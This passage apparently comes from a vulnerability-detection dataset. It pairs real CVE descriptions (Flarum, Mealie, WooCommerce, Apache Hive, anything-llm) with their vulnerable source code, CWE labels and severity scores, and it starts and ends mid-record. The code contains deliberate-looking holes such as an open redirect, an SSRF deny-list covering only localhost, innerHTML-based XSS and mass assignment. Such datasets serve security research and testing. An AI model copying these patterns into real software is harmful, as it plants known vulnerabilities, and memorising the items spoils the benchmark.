schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352",
      "CWE-95"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 26,
    "cve": "CVE-2024-21641",
    "description": "Flarum is open source discussion platform software. Prior to version 1.8.5, the Flarum `/logout` route includes a redirect parameter that allows any third party to redirect users from a (trusted) domain of the Flarum installation to redirect to any link. For logged-in users, the logout must be confirmed. Guests are immediately redirected. This could be used by spammers to redirect to a web address using a trusted domain of a running Flarum installation. The vulnerability has been fixed and published as flarum/core v1.8.5. As a workaround, some extensions modifying the logout route can remedy this issue if their implementation is safe.",
    "vulnerability": {
      "file_level": [
        {
          "name": "framework/core/src/Forum/Controller/LogOutController.php",
          "content": "<?php\n\n/*\n * This file is part of Flarum.\n *\n * For detailed copyright and license information, please view the\n * LICENSE file that was distributed with this source code.\n */\n\nnamespace Flarum\\Forum\\Controller;\n\nuse Flarum\\Http\\Exception\\TokenMismatchException;\nuse Flarum\\Http\\Rememberer;\nuse Flarum\\Http\\RequestUtil;\nuse Flarum\\Http\\SessionAuthenticator;\nuse Flarum\\Http\\UrlGenerator;\nuse Flarum\\User\\Event\\LoggedOut;\nuse Illuminate\\Contracts\\Events\\Dispatcher;\nuse Illuminate\\Contracts\\View\\Factory;\nuse Illuminate\\Support\\Arr;\nuse Laminas\\Diactoros\\Response\\HtmlResponse;\nuse Laminas\\Diactoros\\Response\\RedirectResponse;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface as Request;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass LogOutController implements RequestHandlerInterface\n{\n    /**\n     * @var Dispatcher\n     */\n    protected $events;\n\n    /**\n     * @var SessionAuthenticator\n     */\n    protected $authenticator;\n\n    /**\n     * @var Rememberer\n     */\n    protected $rememberer;\n\n    /**\n     * @var Factory\n     */\n    protected $view;\n\n    /**\n     * @var UrlGenerator\n     */\n    protected $url;\n\n    /**\n     * @param Dispatcher $events\n     * @param SessionAuthenticator $authenticator\n     * @param Rememberer $rememberer\n     * @param Factory $view\n     * @param UrlGenerator $url\n     */\n    public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }\n\n    /**\n     * @param Request $request\n     * @return ResponseInterface\n     * @throws TokenMismatchException\n     */\n    public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }",
        "public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "        UrlGenerator $url"
        },
        {
          "line_no": 85,
          "content": "        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());"
        },
        {
          "line_no": 87,
          "content": "        // If there is no user logged in, return to the index."
        },
        {
          "line_no": 89,
          "content": "            return new RedirectResponse($url);"
        },
        {
          "line_no": 97,
          "content": "            $return = Arr::get($request->getQueryParams(), 'return');"
        },
        {
          "line_no": 100,
          "content": "                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));"
        },
        {
          "line_no": 106,
          "content": "        $response = new RedirectResponse($url);"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 692,
    "cve": "CVE-2024-31991",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the safe_scrape_html function utilizes a user-controlled URL to issue a request to a remote server. Based on the content of the response, it will either parse the content or disregard it. This function, nor those that call it, add any restrictions on the URL that can be provided, nor is it restricted to being an FQDN (i.e., an IP address can be provided). As this function’s return will be handled differently by its caller depending on the response, it is possible for an attacker to use this functionality to positively identify HTTP(s) servers on the local network with any IP/port combination. This issue can result in any authenticated user being able to map HTTP servers on a local network that the Mealie service has access to. Note that by default any user can create an account on a Mealie server, and that the default changeme@example.com user is available with its hard-coded password. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.1,
    "cvss_version": 3.1
  },
  {
    "id": 840,
    "cve": "CVE-2024-37297",
    "description": "WooCommerce is an open-source e-commerce platform built on WordPress. A vulnerability introduced in WooCommerce 8.8 allows for cross-site scripting. A bad actor can manipulate a link to include malicious HTML & JavaScript content. While the content is not saved to the database, the links may be sent to victims for malicious purposes. The injected JavaScript could hijack content & data stored in the browser, including the session. The URL content is read through the `Sourcebuster.js` library and then inserted without proper sanitization to the classic checkout and registration forms. Versions 8.8.5 and 8.9.3 contain a patch for the issue. As a workaround, one may disable the Order Attribution feature.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugins/woocommerce/client/legacy/js/frontend/order-attribution.js",
          "content": "( function ( wc_order_attribution ) {\n\t'use strict';\n\t// Cache params reference for shorter reusability.\n\tconst params = wc_order_attribution.params;\n\n\t// Helper functions.\n\tconst $ = document.querySelector.bind( document );\n\tconst propertyAccessor = ( obj, path ) => path.split( '.' ).reduce( ( acc, part ) => acc && acc[ part ], obj );\n\tconst returnNull = () => null;\n\tconst stringifyFalsyInputValue = ( value ) => value === null || value === undefined ? '' : value;\n\n\t// Hardcode Checkout store key (`wc.wcBlocksData.CHECKOUT_STORE_KEY`), as we no longer have `wc-blocks-checkout` as a dependency.\n\tconst CHECKOUT_STORE_KEY = 'wc/store/checkout';\n\n\t/**\n\t * Get the order attribution data.\n\t *\n\t * Returns object full of `null`s if tracking is disabled.\n\t *\n\t * @returns {Object} Schema compatible object.\n\t */\n\tfunction getData() {\n\t\tconst accessor = params.allowTracking ? propertyAccessor : returnNull;\n\t\tconst entries = Object.entries( wc_order_attribution.fields )\n\t\t\t\t.map( ( [ key, property ] ) => [ key, accessor( sbjs.get, property ) ] );\n\t\treturn Object.fromEntries( entries );\n\t}\n\n\t/**\n\t * Update `wc_order_attribution` input elements' values.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateFormValues( values ) {\n\t\t// Update `<wc-order-attribution-inputs>` elements if any exist.\n\t\tfor( const element of document.querySelectorAll( 'wc-order-attribution-inputs' ) ) {\n\t\t\telement.values = values;\n\t\t}\n\n\t};\n\n\t/**\n\t * Update Checkout extension data.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateCheckoutBlockData( values ) {\n\t\t// Update Checkout block data if available.\n\t\tif ( window.wp && window.wp.data && window.wp.data.dispatch && window.wc && window.wc.wcBlocksData ) {\n\t\t\twindow.wp.data.dispatch( window.wc.wcBlocksData.CHECKOUT_STORE_KEY ).__internalSetExtensionData(\n\t\t\t\t'woocommerce/order-attribution',\n\t\t\t\tvalues,\n\t\t\t\ttrue\n\t\t\t);\n\t\t}\n\t}\n\n\t/**\n\t * Initialize sourcebuster & set data, or clear cookies & data.\n\t *\n\t * @param {boolean} allow Whether to allow tracking or disable it.\n\t */\n\twc_order_attribution.setOrderTracking = function( allow ) {\n\t\tparams.allowTracking = allow;\n\t\tif ( ! allow ) {\n\t\t\t// Reset cookies, and clear form data.\n\t\t\tremoveTrackingCookies();\n\t\t} else if ( typeof sbjs === 'undefined' ) {\n\t\t\treturn; // Do nothing, as sourcebuster.js is not loaded.\n\t\t} else {\n\t\t\t// If not done yet, initialize sourcebuster.js which populates `sbjs.get` object.\n\t\t\tsbjs.init( {\n\t\t\t\tlifetime: Number( params.lifetime ),\n\t\t\t\tsession_length: Number( params.session ),\n\t\t\t\ttimezone_offset: '0', // utc\n\t\t\t} );\n\t\t}\n\t\tconst values = getData();\n\t\tupdateFormValues( values );\n\t\tupdateCheckoutBlockData( values );\n\t}\n\n\t/**\n\t * Remove sourcebuster.js cookies.\n\t * To be called whenever tracking is disabled or consent is revoked.\n\t */\n\tfunction removeTrackingCookies() {\n\t\tconst domain = window.location.hostname;\n\t\tconst sbCookies = [\n\t\t\t'sbjs_current',\n\t\t\t'sbjs_current_add',\n\t\t\t'sbjs_first',\n\t\t\t'sbjs_first_add',\n\t\t\t'sbjs_session',\n\t\t\t'sbjs_udata',\n\t\t\t'sbjs_migrations',\n\t\t\t'sbjs_promo'\n\t\t];\n\n\t\t// Remove cookies\n\t\tsbCookies.forEach( ( name ) => {\n\t\t\tdocument.cookie = `${name}=; path=/; max-age=-999; domain=.${domain};`;\n\t\t} );\n\t}\n\n\t// Run init.\n\twc_order_attribution.setOrderTracking( params.allowTracking );\n\n\t// Work around the lack of explicit script dependency for the checkout block.\n\t// Conditionally, wait for and use 'wp-data' & 'wc-blocks-checkout.\n\n\t// Wait for (async) block checkout initialization and set source values once loaded.\n\tfunction eventuallyInitializeCheckoutBlock() {\n\t\tif (\n\t\t\twindow.wp && window.wp.data && typeof window.wp.data.subscribe === 'function'\n\t\t) {\n\t\t\t// Update checkout block data once more if the checkout store was loaded after this script.\n\t\t\tconst unsubscribe = window.wp.data.subscribe( function () {\n\t\t\t\tunsubscribe();\n\t\t\t\tupdateCheckoutBlockData( getData() );\n\t\t\t}, CHECKOUT_STORE_KEY );\n\t\t}\n\t};\n\t// Wait for DOMContentLoaded to make sure wp.data is in place, if applicable for the page.\n\tif (document.readyState === \"loading\") {\n\t\tdocument.addEventListener(\"DOMContentLoaded\", eventuallyInitializeCheckoutBlock);\n\t} else {\n\t\teventuallyInitializeCheckoutBlock();\n\t}\n\n\t/**\n\t * Define an element to contribute order attribute values to the enclosing form.\n\t * To be used with the classic checkout.\n\t */\n\twindow.customElements.define( 'wc-order-attribution-inputs', class extends HTMLElement {\n\t\t// Our bundler version does not support private class members, so we use a convention of `_` prefix.\n\t\t// #values\n\t\t// #fieldNames\n\t\tconstructor(){\n\t\t\tsuper();\n\t\t\t// Cache fieldNames available at the construction time, to avoid malformed behavior if they change in runtime.\n\t\t\tthis._fieldNames = Object.keys( wc_order_attribution.fields );\n\t\t\t// Allow values to be lazily set before CE upgrade.\n\t\t\tif ( this.hasOwnProperty( '_values' ) ) {\n\t\t\t  let values = this.values;\n\t\t\t  // Restore the setter.\n\t\t\t  delete this.values;\n\t\t\t  this.values = values || {};\n\t\t\t}\n\t\t}\n\t\t/**\n\t\t * Stamp input elements to the element's light DOM.\n\t\t *\n\t\t * We could use `.elementInternals.setFromValue` and avoid sprouting `<input>` elements,\n\t\t * but it's not yet supported in Safari.\n\t\t */\n\t\tconnectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}\n\n\t\t/**\n\t\t * Update form values.\n\t\t */\n\t\tset values( values ) {\n\t\t\tthis._values = values;\n\t\t\tif( this.isConnected ) {\n\t\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\t\tconst input = this.querySelector( `input[name=\"${params.prefix}${fieldName}\"]` );\n\t\t\t\t\tif( input ) {\n\t\t\t\t\t\tinput.value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\t\t} else {\n\t\t\t\t\t\tconsole.warn( `Field \"${fieldName}\" not found. Most likely, the '<wc-order-attribution-inputs>' element was manipulated.`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tget values() {\n\t\t\treturn this._values;\n\t\t}\n\t} );\n\n\n}( window.wc_order_attribution ) );\n"
        }
      ],
      "method_level": [
        "connectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}"
      ],
      "hunk_level": [
        {
          "line_no": 158,
          "content": "\t\t\tlet inputs = '';"
        },
        {
          "line_no": 160,
          "content": "\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );"
        },
        {
          "line_no": 161,
          "content": "\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;"
        },
        {
          "line_no": 163,
          "content": "\t\t\tthis.innerHTML = inputs;"
        }
      ]
    },
    "cwe": [
      "CWE-79",
      "CWE-80"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 1344,
    "cve": "CVE-2024-23945",
    "description": "Signing cookies is an application security feature that adds a digital signature to cookie data to verify its authenticity and integrity. The signature helps prevent malicious actors from modifying the cookie value, which can lead to security vulnerabilities and exploitation. Apache Hive’s service component accidentally exposes the signed cookie to the end user when there is a mismatch in signature between the current and expected cookie. Exposing the correct cookie signature can lead to further exploitation.\n\nThe vulnerable CookieSigner logic was introduced in Apache Hive by HIVE-9710 (1.2.0) and in Apache Spark by SPARK-14987 (2.0.0). The affected components are the following:\n* org.apache.hive:hive-service\n* org.apache.spark:spark-hive-thriftserver_2.11\n* org.apache.spark:spark-hive-thriftserver_2.12",
    "vulnerability": {
      "file_level": [
        {
          "name": "sql/hive-thriftserver/src/main/java/org/apache/hive/service/CookieSigner.java",
          "content": "/*\n * Licensed to the Apache Software Foundation (ASF) under one or more\n * contributor license agreements.  See the NOTICE file distributed with\n * this work for additional information regarding copyright ownership.\n * The ASF licenses this file to You under the Apache License, Version 2.0\n * (the \"License\"); you may not use this file except in compliance with\n * the License.  You may obtain a copy of the License at\n *\n *    http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.apache.hive.service;\n\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\nimport org.apache.commons.codec.binary.Base64;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n/**\n * The cookie signer generates a signature based on SHA digest\n * and appends it to the cookie value generated at the\n * server side. It uses SHA digest algorithm to sign and verify signatures.\n */\npublic class CookieSigner {\n  private static final String SIGNATURE = \"&s=\";\n  private static final String SHA_STRING = \"SHA-256\";\n  private byte[] secretBytes;\n  private static final Logger LOG = LoggerFactory.getLogger(CookieSigner.class);\n\n  /**\n   * Constructor\n   * @param secret Secret Bytes\n   */\n  public CookieSigner(byte[] secret) {\n    if (secret == null) {\n      throw new IllegalArgumentException(\" NULL Secret Bytes\");\n    }\n    this.secretBytes = secret.clone();\n  }\n\n  /**\n   * Sign the cookie given the string token as input.\n   * @param str Input token\n   * @return Signed token that can be used to create a cookie\n   */\n  public String signCookie(String str) {\n    if (str == null || str.isEmpty()) {\n      throw new IllegalArgumentException(\"NULL or empty string to sign\");\n    }\n    String signature = getSignature(str);\n\n    if (LOG.isDebugEnabled()) {\n      LOG.debug(\"Signature generated for \" + str + \" is \" + signature);\n    }\n    return str + SIGNATURE + signature;\n  }\n\n  /**\n   * Verify a signed string and extracts the original string.\n   * @param signedStr The already signed string\n   * @return Raw Value of the string without the signature\n   */\n  public String verifyAndExtract(String signedStr) {\n    int index = signedStr.lastIndexOf(SIGNATURE);\n    if (index == -1) {\n      throw new IllegalArgumentException(\"Invalid input sign: \" + signedStr);\n    }\n    String originalSignature = signedStr.substring(index + SIGNATURE.length());\n    String rawValue = signedStr.substring(0, index);\n    String currentSignature = getSignature(rawValue);\n\n    if (LOG.isDebugEnabled()) {\n      LOG.debug(\"Signature generated for \" + rawValue + \" inside verify is \" + currentSignature);\n    }\n    if (!MessageDigest.isEqual(originalSignature.getBytes(), currentSignature.getBytes())) {\n      throw new IllegalArgumentException(\"Invalid sign, original = \" + originalSignature +\n        \" current = \" + currentSignature);\n    }\n    return rawValue;\n  }\n\n  /**\n   * Get the signature of the input string based on SHA digest algorithm.\n   * @param str Input token\n   * @return Signed String\n   */\n  private String getSignature(String str) {\n    try {\n      MessageDigest md = MessageDigest.getInstance(SHA_STRING);\n      md.update(str.getBytes());\n      md.update(secretBytes);\n      byte[] digest = md.digest();\n      return new Base64(0).encodeToString(digest);\n    } catch (NoSuchAlgorithmException ex) {\n      throw new RuntimeException(\"Invalid SHA digest String: \" + SHA_STRING +\n        \" \" + ex.getMessage(), ex);\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "public String verifyAndExtract(String signedStr) {\n    int index = signedStr.lastIndexOf(SIGNATURE);\n    if (index == -1) {\n      throw new IllegalArgumentException(\"Invalid input sign: \" + signedStr);\n    }\n    String originalSignature = signedStr.substring(index + SIGNATURE.length());\n    String rawValue = signedStr.substring(0, index);\n    String currentSignature = getSignature(rawValue);\n\n    if (LOG.isDebugEnabled()) {\n      LOG.debug(\"Signature generated for \" + rawValue + \" inside verify is \" + currentSignature);\n    }\n    if (!MessageDigest.isEqual(originalSignature.getBytes(), currentSignature.getBytes())) {\n      throw new IllegalArgumentException(\"Invalid sign, original = \" + originalSignature +\n        \" current = \" + currentSignature);\n    }\n    return rawValue;\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 84,
          "content": "      throw new IllegalArgumentException(\"Invalid sign, original = \" + originalSignature +"
        },
        {
          "line_no": 85,
          "content": "        \" current = \" + currentSignature);"
        }
      ]
    },
    "cwe": [
      "CWE-209"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.9,
    "cvss_version": 3.1
  },
  {
    "id": 650,
    "cve": "CVE-2024-0404",
    "description": "A mass assignment vulnerability exists in the `/api/invite/:code` endpoint of the mintplex-labs/anything-llm repository, allowing unauthorized creation of high-privileged accounts. By intercepting and modifying the HTTP request during the account creation process via an invitation link, an attacker can add a `role` property with `admin` value, thereby gaining administrative access. This issue arises due to the lack of property allowlisting and blocklisting, enabling the attacker to exploit the system and perform actions as an administrator.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/endpoints/invite.js",
          "content": "const { Invite } = require(\"../models/invite\");\nconst { User } = require(\"../models/user\");\nconst { reqBody } = require(\"../utils/http\");\n\nfunction inviteEndpoints(app) {\n  if (!app) return;\n\n  app.get(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const invite = await Invite.get({ code });\n      if (!invite) {\n        response.status(200).json({ invite: null, error: \"Invite not found.\" });\n        return;\n      }\n\n      if (invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ invite: null, error: \"Invite is no longer valid.\" });\n        return;\n      }\n\n      response\n        .status(200)\n        .json({ invite: { code, status: invite.status }, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n\n  app.post(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const userParams = reqBody(request);\n      const invite = await Invite.get({ code });\n      if (!invite || invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ success: false, error: \"Invite not found or is invalid.\" });\n        return;\n      }\n\n      const { user, error } = await User.create(userParams);\n      if (!user) {\n        console.error(\"Accepting invite:\", error);\n        response\n          .status(200)\n          .json({ success: false, error: \"Could not create user.\" });\n        return;\n      }\n\n      await Invite.markClaimed(invite.id, user);\n      response.status(200).json({ success: true, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n}\n\nmodule.exports = { inviteEndpoints };\n"
        }
      ],
      "method_level": [
        "function inviteEndpoints(app) {\n  if (!app) return;\n\n  app.get(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const invite = await Invite.get({ code });\n      if (!invite) {\n        response.status(200).json({ invite: null, error: \"Invite not found.\" });\n        return;\n      }\n\n      if (invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ invite: null, error: \"Invite is no longer valid.\" });\n        return;\n      }\n\n      response\n        .status(200)\n        .json({ invite: { code, status: invite.status }, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n\n  app.post(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const userParams = reqBody(request);\n      const invite = await Invite.get({ code });\n      if (!invite || invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ success: false, error: \"Invite not found or is invalid.\" });\n        return;\n      }\n\n      const { user, error } = await User.create(userParams);\n      if (!user) {\n        